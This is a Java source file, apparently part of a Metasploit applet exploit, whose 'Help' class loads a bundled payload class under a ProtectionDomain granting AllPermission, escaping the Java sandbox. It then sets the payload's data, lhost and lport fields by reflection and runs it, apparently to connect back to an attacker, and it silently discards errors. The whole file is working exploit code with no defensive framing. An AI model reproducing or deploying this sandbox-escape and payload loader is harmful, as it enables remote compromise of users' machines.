package msf.x;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.lang.reflect.Field;

public class Help extends ClassLoader implements Serializable{
	public static void doWork(Help h, Exploit expl, String data, String jar, String lhost, int lport) {

		String classNames[] = { "msf.x.PayloadX$StreamConnector", "msf.x.PayloadX" };
		String classPaths[] = { "/msf/x/PayloadX$StreamConnector.class", "/msf/x/PayloadX.class" };
		Class cls = null;

		try
		{
			for( int index=0 ; index<classNames.length ; index++ )
			{

				ByteArrayOutputStream bos = new ByteArrayOutputStream();
				byte[] buffer = new byte[8192];
				int length;
			
				// read in the class file from the jar
				InputStream is = expl.getClass().getResourceAsStream( classPaths[index] );

				// and write it out to the byte array stream
				while( ( length = is.read( buffer ) ) > 0 )
					bos.write( buffer, 0, length );

				// convert it to a simple byte array
				buffer = bos.toByteArray();

				URL url = new URL( "file:///" );
				Certificate[] certs = new Certificate[0];
				Permissions perm = new Permissions();
				perm.add( new AllPermission() );
				ProtectionDomain pd = new ProtectionDomain( new CodeSource( url, certs ), perm );
				cls = h.defineClass( classNames[index], buffer, 0, buffer.length, pd );
			}

			// cls will end up being the PayloadX class
			if( cls != null )
			{
				// reflect into the PayloadX class to get these three fields
				Field payload_data  = cls.getField( "data" );
				Field payload_jar   = cls.getField( "jar" );
				Field payload_lhost = cls.getField( "lhost" );
				Field payload_lport = cls.getField( "lport" );

				// instantiate the PayloadX object once so as we can set the native payload data
				Object obj = cls.newInstance();

				// set the native payload data, lhost and lport
				payload_data.set( obj, data );
				payload_jar.set( obj, jar );
				payload_lhost.set( obj, lhost );
				payload_lport.setInt( obj, lport );

				// instantiate a second PayloadX object to perform the actual payload
				obj = cls.newInstance();
			}
		}
		catch( Exception e ) {
			//System.out.println(e.getMessage());
		}
	}
}
